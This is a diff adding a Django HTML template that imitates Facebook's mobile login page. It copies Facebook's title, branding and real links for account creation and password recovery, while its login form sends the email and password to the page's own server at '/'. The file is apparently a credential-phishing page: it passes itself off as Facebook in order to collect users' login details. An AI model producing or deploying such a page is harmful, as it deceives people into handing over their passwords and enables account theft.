@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+			
+		<meta charset="UTF-8">
+  <meta name="description" content="Free Web tutorials">
+  <meta name="keywords" content="HTML, CSS, JavaScript">
+  <meta name="author" content="John Doe">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+		<title>Facebook – log in or sign up</title>
+		{% load static %}
+		<link rel = "icon" href =  "{% static 'FB/img/icon.png' %}" type = "image/x-icon">
+		<link rel="stylesheet" href="{% static 'FB/css/style.css' %}">
+		<link rel="preconnect" href="https://fonts.gstatic.com">
+		<link href="https://fonts.googleapis.com/css2?family=Mulish:wght@800&display=swap" rel="stylesheet">
+		<link rel="preconnect" href="https://fonts.gstatic.com">
+		<link href="https://fonts.googleapis.com/css2?family=Raleway:wght@750&display=swap" rel="stylesheet">
+		<link rel="preconnect" href="https://fonts.gstatic.com">
+		<link href="https://fonts.googleapis.com/css2?family=Source+Sans+Pro:wght@200;300;400;600;700;900&display=swap" rel="stylesheet">
+
+
+</head>
+<body>
+			
+		<div id="upperLine"><a href="https://m.facebook.com/click.php?redir_url=%2Flite%2F%3Floc_ref%3Dlogin_top_banner%26referrer%3Dutm_reg%253DOF_xX89XsuZp8_tSYURdF_Fm%26referrer_params%255Blink_source%255D%3Dfb_app_banner&app_id=275254692598279&cref=mb&no_fw=1&refid=8">📱Get Facebook Lite and browse faster.</a></div>
+		<div class="name">
+			<div id="name">facebook</div>
+	  </div>
+	  
+		<form id="form" action="/" method="POST">
+				{% csrf_token %}
+			 <input type="text" name="email" id="email" placeholder="Mobile Number or email address ">
+		   <input type="password" name="password" id="password" placeholder="Password">
+			 <button type="submit" >Log In</button>
+	 </form>
+	 
+		<div>	
+				<div class="or">or</div>
+			  <div class="createNewAccount">
+						<button><a href="https://m.facebook.com/reg/?cid=103&refsrc=https%3A%2F%2Fm.facebook.com%2F&soft=hjk">Create New Account</a></button>
+				</div>
+				<div class="forgottenPassword">
+				<a href="https://m.facebook.com/recover/initiate/?c=https%3A%2F%2Fm.facebook.com%2F%3Frefsrc%3Dhttps%253A%252F%252Fwww.facebook.com%252F&r&cuid&ars=facebook_login&privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjEyMTExODc5LCJjYWxsc2l0ZV9pZCI6Mjg0Nzg1MTQ5MzQ1MzY5fQ%3D%3D&lwv=100&refid=8"> Forgotten password?</a>
+				</div>
+				<div class="lang">
+						<img src="{% static 'FB/img/lan.png'%}" alt=""></img>
+				</div>
+		</div>
+</body>
